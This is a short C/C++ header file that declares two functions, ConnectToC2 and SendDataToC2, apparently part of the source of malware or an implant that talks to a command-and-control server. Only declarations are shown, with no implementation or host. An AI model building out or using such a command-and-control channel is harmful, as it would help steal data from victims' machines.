#pragma once
#include "common.h"

BOOL ConnectToC2();
BOOL SendDataToC2(const BYTE* data, DWORD size);